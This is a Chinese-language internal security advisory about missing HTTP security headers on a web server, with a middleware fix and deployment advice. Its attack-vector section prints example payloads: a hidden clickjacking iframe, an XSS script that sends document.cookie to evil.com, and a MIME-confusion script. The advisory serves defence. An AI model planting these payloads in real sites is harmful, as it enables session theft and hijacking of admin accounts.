# HRVU-20260001 - HTTP 安全响应头缺失

## 编号
**HRVU-20260001**

- **HRVU**: High-Risk Vulnerability Update（高危漏洞更新）
- **202600**: 来源更新ID（未知来源/主动发现）
- **01**: 该更新后的第1个问题

## 漏洞概述

### 发现时间
2026年4月6日

### 漏洞类型
安全配置缺陷 - HTTP 安全响应头缺失

### 风险等级
**高危**

### 影响范围
所有 HTTP 响应

## 漏洞详情

### 问题描述
服务器在响应 HTTP 请求时，未添加必要的安全响应头，存在以下安全风险：

| 缺失响应头 | 风险类型 | 攻击场景 |
|-----------|---------|---------|
| X-Frame-Options | 点击劫持 | 恶意网站嵌入本站页面，诱导用户点击 |
| X-Content-Type-Options | MIME 混淆 | 上传恶意文件，浏览器错误执行 |
| Content-Security-Policy | XSS 攻击 | 注入恶意脚本，窃取用户信息 |
| Strict-Transport-Security | 中间人攻击 | 降级为 HTTP 进行流量劫持 |
| X-XSS-Protection | XSS 攻击 | 利用浏览器 XSS 过滤器缺陷 |
| Referrer-Policy | 信息泄露 | 敏感 URL 信息通过 Referer 泄露 |
| Permissions-Policy | 功能滥用 | 恶意调用摄像头、麦克风等 |

### 攻击向量

#### 1. 点击劫持攻击 (Clickjacking)
```
攻击者页面:
<iframe src="https://victim-server/admin" style="opacity:0">
  <button onclick="..." style="position:absolute; top:100px; left:100px;">
    点击领取奖励
  </button>
</iframe>

用户点击后实际触发了管理页面的删除操作
```

#### 2. XSS 攻击
```
无 CSP 保护时，攻击者可注入:
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

窃取用户会话信息
```

#### 3. MIME 混淆攻击
```
上传文件 evil.png.html，内容为:
<script>alert('XSS')</script>

无 nosniff 时，浏览器可能按 HTML 执行
```

## 影响评估

### 受影响组件
- 所有 HTTP 响应
- 管理页面 (/admin)
- 文件浏览页面
- API 端点
- Swagger 文档

### 潜在危害
- 管理员账户被劫持
- 用户会话被窃取
- 敏感操作被恶意触发
- 文件被非法删除/修改

## 修复方案

### 实现方式
新增 `SecurityHeadersMiddleware` 中间件，自动为所有响应添加安全响应头。

### 修复内容

#### 1. X-Frame-Options
```
X-Frame-Options: SAMEORIGIN
```
防止页面被非同源 iframe 嵌入。

#### 2. X-Content-Type-Options
```
X-Content-Type-Options: nosniff
```
强制浏览器遵守声明的 Content-Type。

#### 3. Content-Security-Policy
根据页面类型动态配置：
- 普通页面：严格 CSP，禁止内联脚本
- 管理页面：允许内联脚本和 WebSocket
- Swagger：允许内联脚本和样式

#### 4. Strict-Transport-Security
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
强制使用 HTTPS，有效期 1 年。

#### 5. X-XSS-Protection
```
X-XSS-Protection: 1; mode=block
```
启用浏览器 XSS 过滤器。

#### 6. Referrer-Policy
```
Referrer-Policy: strict-origin-when-cross-origin
```
控制 Referer 信息泄露。

#### 7. Permissions-Policy
```
Permissions-Policy: geolocation=(), microphone=(), camera=()
```
禁用敏感浏览器功能。

## 文件变更

### 新增文件
- `Middleware/SecurityHeadersMiddleware.cs` - 安全响应头中间件

### 修改文件
- `Program.cs` - 注册安全响应头中间件

## 部署建议

### 生产环境
1. 确保使用 HTTPS
2. HSTS 会缓存 1 年，首次部署建议使用较短时间测试
3. 监控 CSP 违规报告

### 开发环境
- HTTP 连接不会添加 HSTS 头
- CSP 策略同样生效
